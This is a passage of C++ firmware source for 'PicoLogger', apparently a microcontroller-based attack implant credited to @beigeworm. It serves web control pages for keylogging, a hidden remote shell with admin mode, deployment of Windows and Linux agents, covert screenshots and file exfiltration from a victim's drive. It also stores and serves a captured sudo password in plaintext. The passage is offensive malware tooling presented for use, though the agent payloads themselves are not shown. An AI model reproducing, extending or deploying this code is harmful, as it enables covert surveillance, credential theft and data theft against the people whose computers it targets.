            document.addEventListener("DOMContentLoaded", function() {
                document.getElementById("commandInput").addEventListener("keypress", function(event) {
                    if (event.key === "Enter") {
                        event.preventDefault();
                        executeCommand();
                    }
                });
            });
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Remote Shell</h2>
            <textarea id="outputBox" readonly></textarea>
            <input type="text" id="commandInput" placeholder="Enter command...">
            <button onclick="executeCommand()">Run</button>
            <div class="switch-container">
                <label>Admin Mode
                    <label class="switch">
                        <input type="checkbox" id="adminSwitch">
                        <span class="slider"></span>
                    </label>
                </label>
                <label>Run Hidden
                    <label class="switch">
                        <input type="checkbox" id="hiddenSwitch">
                        <span class="slider"></span>
                    </label>
                </label>
                <button onclick="deployAgent()">Deploy Windows Agent</button>
                <button onclick="deployBashAgent()">Deploy Linux Agent</button>
                <input type="text" id="passwordInput" placeholder="Enter sudo password..." style="width: 20%;">
            </div>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

void handleUpdatePassword() {
    if (server.hasArg("password")) {
        String newPassword = server.arg("password");
        File sudoFile = LittleFS.open("/sudo.txt", "w");
        if (sudoFile) {
            sudoFile.println(newPassword);
            sudoFile.close();
            server.send(200, "text/plain", "Password updated!");
        } else {
            server.send(500, "text/plain", "Error updating password.");
        }
    } else {
        server.send(400, "text/plain", "Password not provided.");
    }
}

void handleGetPassword() {
    String password;
    File sudoFile = LittleFS.open("/sudo.txt", "r");

    if (sudoFile) {
        password = sudoFile.readStringUntil('\n');
        sudoFile.close();
    } else {
        password = "";
    }

    server.send(200, "text/plain", password);
}

// =========================================================== Screenshot Page =================================================================
void handleScreenPage() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Remote Screenshot</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{margin:20px auto;width:80%;align-items: center;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
            h2{text-align:center;color:#fc0}
            input,textarea{box-sizing:border-box;width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;background:#333;color:#fff}
            img{width:100%;height:100%;object-fit:cover;border-radius:5px;margin-top:10px;display:block;align-items: center;}
            button{padding:10px 20px;background:#fc0;color:#000;border:none;font-size:16px;font-weight:700;cursor:pointer;border-radius:5px;margin-top:10px}
            button:hover{background:#fa0}
            .switch-container{display:flex;justify-content:center;gap:20px;margin:15px 0}
            .switch{position:relative;display:inline-block;width:60px;height:34px}
            .switch input{opacity:0;width:0;height:0}
            .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#444;transition:.4s;border-radius:34px}
            .slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background-color:#fff;transition:.4s;border-radius:50%}
            input:checked+.slider{background-color:#fc0}
            input:checked+.slider:before{transform:translateX(26px)}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function deployAgent() {
                let hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";
                let q = document.getElementById("qualityInput").value;
                let s = document.getElementById("scaleInput").value;
            
                fetch('/deploy-screenshot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `hidden=${hiddenMode}&q=${q}&s=${s}`
                })
                .then(response => response.text())
                .then(output => {
                    alert("Agent Deployed");
                })
                .catch(error => console.error('Error deploying agent:', error));
            }
            function takeScreenshot() {
                fetch('/take-screenshot', { method: 'POST' })
                .then(response => response.text())
                .then(() => setTimeout(loadImage, 5000));
            }
            function exitAgent() {
                fetch('/exit-agent', { method: 'POST' })
                .then(response => response.text())
                alert("Agent Closed");
            }
            function loadImage() {
                const img = document.getElementById('screenshot');
                img.src = "/screenshot.jpg?t=" + new Date().getTime();
                img.style.display = 'block';
            }
            window.onload = loadImage;
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
          <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Remote Screenshot</h2>
            <button onclick="takeScreenshot()">Take Screenshot</button>
            <br><br>
            <div align="center" style="width: 100%; height: 100%; overflow: hidden;">
                <img id="screenshot" src="/screenshot.jpg" alt="No screenshot available">
            </div>
            <br>
            <div class="switch-container">
                <label>Quality (1-100)
                    <input type="number" id="qualityInput" min="1" max="100" value="10" style="width:60px;">
                </label>
                <label>Scale (e.g. 2 = &frac12;)
                    <input type="number" id="scaleInput" min="1" max="10" value="2" style="width:60px;">
                </label>
                <label style="padding-top:10px; display:inline-block;">Run Hidden
                    <label class="switch">
                        <input type="checkbox" id="hiddenSwitch">
                        <span class="slider"></span>
                    </label>
                </label>
                <button onclick="deployAgent()">Deploy Agent</button>
                <button onclick="exitAgent()">Close Agent</button>
            </div>    
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}

String generateBreadcrumb(String path) {
    if (path == "/") return "/";

    String breadcrumb = "<a class='folder-link' href='/explorer?path=/'>/</a>";
    int start = 1;
    while (true) {
        int end = path.indexOf('/', start);
        if (end == -1) break;

        String subPath = path.substring(0, end);
        String dirName = path.substring(start, end);
        breadcrumb += "<a class='folder-link' href='/explorer?path=" + subPath + "'>" + dirName + "/</a>";
        start = end + 1;
    }

    if (start < path.length()) {
        String subPath = path;
        String dirName = path.substring(start);
        breadcrumb += "<a class='folder-link' href='/explorer?path=" + subPath + "'>" + dirName + "</a>";
    }

    return breadcrumb;
}

void handleFileExplorer() {
    String path = server.hasArg("path") ? server.arg("path") : "/";
    if (path == "") path = "/";

    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | File Explorer</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container{width:90%;max-width:1000px;margin:20px auto;background:#222;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1);text-align:center}
            h2{text-align:center;color:#fc0}
            table{width:100%;border-collapse:collapse;margin:10px 0}
            th, td{padding:10px;text-align:left;background:#333;color:#fff}
            th{background:#444}
            tr:hover{background:#555}
            button{padding:5px 10px;margin:2px;background:#fc0;color:#000;border:none;border-radius:5px;cursor:pointer;transition:.3s}
            button:hover{background:#fa0}
            a.folder-link{color:#fc0;text-decoration:none;font-weight:bold}
            a.folder-link:hover{text-decoration:underline}
            .breadcrumb{margin:10px 0;color:#fc0;font-weight:bold}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function confirmDelete(filePath) {
                if (confirm("Are you sure you want to delete this file?")) {
                    location.href = '/delete?file=' + encodeURIComponent(filePath);
                }
            }
        </script>
    </head>
    <body>
          <div class="top-bar">
              <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
       <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>LittleFS File Explorer</h2>
            <div class="breadcrumb">Current Directory: )rawliteral" + generateBreadcrumb(path) + R"rawliteral(</div>
            <table>
                <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
    )rawliteral";

    if (path != "/") {
        String parentPath = path.substring(0, path.lastIndexOf('/'));
        if (parentPath == "") parentPath = "/";
        html += "<tr><td colspan='4'><a class='folder-link' href='/explorer?path=" + parentPath + "'>.. (Up)</a></td></tr>";
    }

    Dir root = LittleFS.openDir(path);
    while (root.next()) {
        String fileName = root.fileName();
        size_t fileSize = root.fileSize();
        String fullPath = path + (path == "/" ? "" : "/") + fileName;

        bool isDir = false;
        File file = LittleFS.open(fullPath, "r");
        if (file && file.isDirectory()) {
            isDir = true;
        }
        file.close();

        html += "<tr><td>";

        if (isDir) {
            html += "<a class='folder-link' href='/explorer?path=" + fullPath + "'>" + fileName + "/</a>";
            html += "</td><td>Folder</td><td>-</td>";
        } else {
            html += fileName + "</td><td>File</td><td>" + String(fileSize) + " bytes";
        }

        html += "<td>";

        if (!isDir) {
            html += "<button onclick=\"location.href='/download?file=" + fullPath + "'\">Download</button>";
            html += "<button onclick=\"location.href='/edit?file=" + fullPath + "'\">Edit</button>";
            html += "<button onclick=\"confirmDelete('" + fullPath + "')\">Delete</button>";
        }

        html += "</td></tr>";
    }

    html += R"rawliteral(</table>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";

    server.send(200, "text/html", html);
}


void handleShellExplorer() {
    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote File Explorer</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .top-bar { background: #333; padding: 15px; display: flex; justify-content: flex-start; align-items: center; position: relative; }
            .menu-icon { font-size: 24px; color: #fff; cursor: pointer; }
            .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30, 30, 30, 0.95); opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; display: flex; justify-content: center; align-items: center; z-index: 100; }
            .menu-overlay.active { opacity: 1; visibility: visible; }
            .menu-content { display: flex; flex-direction: column; align-items: center; gap: 20px; }
            .menu-content a { color: #fc0; text-decoration: none; font-size: 24px; background: #444; padding: 15px 30px; border-radius: 10px; transition: background 0.3s ease; width: 200px; text-align: center; }
            .menu-content a:hover { background: #666; }
            .container { max-width: 800px; margin: 0 auto; padding: 20px; }
            h2{text-align:center;color:#fc0}
            input, button { padding: 10px; border-radius: 5px; border: none;}
            input { width: 40%; background: #333; color: #fff; }
            button { background: #fc0; color: #000; font-weight: bold; cursor: pointer; }
            button:hover { background: #fa0; }
            #fileList { margin-top: 20px; text-align: left; background: #222; padding: 10px; border-radius: 10px; }
            .file-entry {display: flex;align-items: center;margin: 5px 0;border-bottom: 1px solid #444;}
            .file-name {flex: 3;cursor: pointer;white-space: nowrap;overflow: hidden;text-overflow: ellipsis;}
            .file-type {flex: 1;text-align: center;color: #aaa;}
            .file-size {flex: 1;text-align: right;color: #aaa;}
            .file-actions {flex: 0 0 auto;margin-left: 10px;}
            .file-name:hover {text-decoration: underline;color: #ff0;}
            .file-entry button {margin-left: 8px;min-width: 60px;height: 28px;line-height: 1.2;padding: 0 8px;font-size: 14px;max-height: none;vertical-align: middle;cursor: pointer;border-radius: 5px;border: none;background-color: #fc0;color: #000;font-weight: bold;}
            .file-entry button:hover {background-color: #fa0;}
            .switch{position:relative;display:inline-block;width:60px;height:34px;transform: translateY(-5px);}
            .switch input{opacity:0;width:0;height:0}
            .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#444;transition:.4s;border-radius:34px}
            .slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background-color:#fff;transition:.4s;border-radius:50%}
            input:checked+.slider{background-color:#fc0}
            input:checked+.slider:before{transform:translateX(26px)}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
        <script>
            function toggleMenu() {
                const overlay = document.getElementById("menuOverlay");
                overlay.classList.toggle("active");
            }
            function formatSize(bytes) {
                if (bytes === "0" || bytes === 0) return "0 B";
                const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                let i = 0;
                let num = parseInt(bytes, 10);
                while (num >= 1024 && i < sizes.length - 1) {
                    num /= 1024;
                    i++;
                }
                return num.toFixed(2) + ' ' + sizes[i];
            }
            
            function listFiles(path = null) {
                const input = document.getElementById("pathInput");
                const currentPath = path !== null ? path : input.value;
                input.value = currentPath;
                fetch("/list_files?path=" + encodeURIComponent(currentPath))
                .then(res => res.text())
                .then(data => {
                    const list = document.getElementById("fileList");
                    list.innerHTML = "";
                    if (currentPath.length > 3) {
                        const normalized = currentPath.replace(/\\+$/, "");
                        const parts = normalized.split("\\");
                        parts.pop();
                        let parentPath = parts.join("\\");
                        if (/^[A-Za-z]:$/.test(parentPath)) {
                            parentPath += "\\";
                        }
                        const upEntry = document.createElement("div");
                        upEntry.className = "file-entry";
            
                        const escapedParent = parentPath.replace(/\\/g, '\\\\');
                        upEntry.innerHTML = `<span onclick="listFiles('${escapedParent}')">[..]</span>`;
                        list.appendChild(upEntry);
                    }
                    data.split("\n").forEach(line => {
                        if (line.trim() === "") return;
                        let [type, fullpath, size] = line.split("|||");
                        if (type === "dir") type = "Folder";
                        else if (type === "file") type = "File";
                        size = formatSize(size);        
                        const entry = document.createElement("div");
                        entry.className = "file-entry";            
                        const escapedPath = fullpath.replace(/\\/g, '\\\\');           
                        if (type === "Folder") {
                            entry.innerHTML = `<span class="file-name" onclick="listFiles('${escapedPath}')">${fullpath}</span>` +
                                              `<span class="file-type">${type}</span>` +
                                              `<span class="file-size"></span>`;
                        } else {
                            entry.innerHTML = `<span class="file-name">${fullpath}</span>` +
                                              `<span class="file-type">${type}</span>` +
                                              `<span class="file-size">${size}</span>` +
                                              `<span class="file-actions"><button onclick="downloadFile('${escapedPath}')">Download</button></span>`;
                        }
                        list.appendChild(entry);
                    });
                });
            }
            function downloadFile(path) {
                fetch("/download_file?path=" + encodeURIComponent(path))
                    .then(res => res.text())
                    .then(msg => alert(msg))
                    .catch(err => alert("Error: " + err));
            }
            function deploy() {
                const hiddenMode = document.getElementById("hiddenSwitch").checked ? "1" : "0";          
                fetch("/deploy_explorer", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: `hidden=${hiddenMode}`
                })
                .then(res => res.text())
                .then(msg => alert("File Agent Deployed"))
                .catch(err => alert("Failed to deploy agent: " + err));
            }
            function exitAgent() {
                fetch("/exit_agent", { method: 'POST' }).then(() => alert("Agent stopped."));
            }
            window.onload = () => {
                listFiles("C:\\\\");
            }
        </script>
    </head>
    <body>
      <div class="top-bar">
          <div class="menu-icon" onclick="toggleMenu()">&#9776;</div>
              <div class="menu-overlay" id="menuOverlay" style="background: rgba(30, 30, 30, 0.8); backdrop-filter: blur(5px);">
                  <div class="menu-content">
                      <a href="/" onclick="toggleMenu()">Keylogger</a>
                      <a href="/payloads" onclick="toggleMenu()">Payload Manager</a>
                      <a href="/keyboard" onclick="toggleMenu()">Virtual Keyboard</a>
                      <a href="/shell" onclick="toggleMenu()">Remote Shell</a>
                      <a href="/screen" onclick="toggleMenu()">Screenshots</a>
                      <a href="/exfiltrate" onclick="toggleMenu()">Exfiltration</a>
                      <a href="/settings" onclick="toggleMenu()">Settings</a>
                      <a href="/explorer" onclick="toggleMenu()">File Explorer</a>
                  </div>
              </div>
          </div>
     </div>
       <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
            <h2>Remote Exfiltration</h2>
            <input type="text" id="pathInput" placeholder="Enter path, e.g., C:\\" />
            <button onclick="listFiles()">List Files</button>

            <label style="display:inline-block;">Run Hidden
                <label class="switch">
                    <input type="checkbox" id="hiddenSwitch">
                    <span class="slider"></span>
                </label>
            </label>
            <button onclick="deploy()">Deploy Agent</button>
            <button onclick="exitAgent()">Exit Agent</button>

            <div id="fileList"></div>
        </div>
    </body>
    </html>
    )rawliteral";
    server.send(200, "text/html", page);
}
